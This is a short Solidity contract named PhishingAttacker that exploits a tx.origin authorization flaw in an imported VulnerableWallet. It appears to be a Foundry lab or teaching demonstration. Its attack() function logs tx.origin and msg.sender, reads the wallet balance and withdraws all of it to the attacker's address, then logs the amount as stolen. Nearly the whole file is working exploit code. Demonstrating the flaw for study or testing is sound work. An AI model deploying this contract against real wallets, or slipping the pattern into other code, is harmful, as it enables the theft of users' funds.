// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableWallet.sol";
import "forge-std/console.sol";

contract PhishingAttacker {
    VulnerableWallet public wallet;
    address public attacker;
    
    constructor(address _walletAddress) {
        wallet = VulnerableWallet(_walletAddress);
        attacker = msg.sender;
    }
    
    function attack() public {
        console.log("[PHISHING] tx.origin:", tx.origin);
        console.log("[PHISHING] msg.sender:", msg.sender);
        console.log("[PHISHING] Wallet balance:", wallet.getBalance());
        
        uint256 amount = wallet.getBalance();
        wallet.withdraw(payable(attacker), amount);
        
        console.log("[SUCCESS] Stolen:", amount);
    }
    
    receive() external payable {}
}

